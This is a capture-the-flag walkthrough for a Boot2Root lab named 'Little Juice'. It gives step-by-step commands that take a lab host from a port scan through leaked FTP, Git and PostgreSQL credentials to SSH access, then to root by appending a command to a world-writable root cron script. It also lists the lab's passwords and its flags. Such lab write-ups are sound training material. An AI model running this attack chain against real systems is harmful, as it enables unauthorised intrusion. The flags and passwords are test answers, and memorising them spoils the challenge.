---
title: "Little Juice Challenge — Boot2Root"
date: 2026-06-03
description: "A Boot2Root Docker challenge involving port scanning, Git repository exposure, lateral movement via PostgreSQL, and privilege escalation through a misconfigured cronjob."
tags:
    - Boot2Root
    - Nmap
    - Git
    - PostgreSQL
    - Privilege Escalation
    - Docker
---

## Overview

"Little Juice" is a Boot-to-Root scenario simulating a real intrusion in a Docker-based infrastructure. The goal is to start from an external audit, map the attack surface, gain initial access, and escalate privileges progressively until achieving full root control and capturing the final flag.

This challenge explores common misconfiguration flaws in corporate and DevOps environments.

---

## Techniques Covered

- **Scanning & Reconnaissance:** Enumeration of exposed ports and services.
- **Information Leakage:** Accidental exposure of configuration files and hidden Git repositories.
- **Lateral Movement:** Extracting credentials from databases to migrate access to interactive OS shells.
- **Privilege Escalation (Cronjobs):** Exploiting automated tasks running with root privileges whose write permissions were granted to regular users.

---

## Challenge Setup

The environment included a Ubuntu host running vsftpd, PostgreSQL, OpenSSH, git, and cron.

Key vulnerabilities planted:
- FTP server on port 2121 exposing a `.git` directory containing a sensitive `config.php` in its commit history (credentials: `db_admin` / `G1t_Hub_Rocks!`)
- PostgreSQL on port 5433 configured to listen on all interfaces, containing SSH credentials in a `system_ssh` table
- SSH on port 2222
- HTTP server on port 8080
- A root cronjob running `/opt/sync_git.sh` every minute with `chmod 777` — writable by any user

---

## Solution Walkthrough

### Step 1 — Port Scanning
```bash
nmap -p- --min-rate 1000 172.30.2.33
```
**Ports discovered:**
- `2121/tcp` — FTP (vsFTPd 3.0.5)
- `2222/tcp` — SSH
- `5433/tcp` — PostgreSQL
- `8080/tcp` — HTTP

---

### Step 2 — Web Enumeration
```bash
curl http://172.30.2.33:8080/robots.txt
curl http://172.30.2.33:8080/
```
The `robots.txt` reveals a restricted `/README.txt`. An HTML comment in the page source exposes FTP credentials in plaintext:
```
anonymous:An0nym0us-som3tim3s-r3quir3s-a-p4ssw0rd
```

---

### Step 3 — Web Hint
Navigate to `Meet the Team > Anthony Goes` — the hint points to checking `/opt` for maintenance scripts.

---

### Step 4 — FTP & Git History Exploitation
Log into FTP with the anonymous credentials. The `.git` directory is exposed. Recover the sensitive commit history:
```bash
git log
git show <commit-hash>
```
**Credentials found:** `db_admin` / `G1t_Hub_Rocks!`

---

### Step 5 — PostgreSQL Lateral Movement
Connect to the database using the recovered credentials:
```bash
psql -h 172.30.2.33 -p 5433 -U db_admin
SELECT * FROM system_ssh;
```
**SSH credentials found:** `student` / `Ss8_4cceSS_2026#`

---

### Step 6 — SSH Access & Zip Bomb
```bash
ssh student@172.30.2.33 -p 2222
```
A `level50.zip` is waiting. Unpack all 50 nested levels automatically:
```bash
f="level50.zip"; while [[ -f "$f" && "$f" == *.zip ]]; do n=$(unzip -Z1 "$f" | head -n1); unzip -o "$f"; rm "$f"; f="$n"; done
```

---

### Step 7 — Privilege Escalation via Cronjob
The root cronjob runs `/opt/sync_git.sh` every minute with world-write permissions. Inject a reverse shell or read the flag:
```bash
echo 'cat /usr/lib/kernel/fl46_b00t2r00t' >> /opt/sync_git.sh
# Wait up to 1 minute for the cron to execute
```

---

## Flag

`fLaG_fSt_{FiN4LLy_R00t}`  
`fLaG_fSt_{sCrIpTiNg_Is_AwEsOmE}`
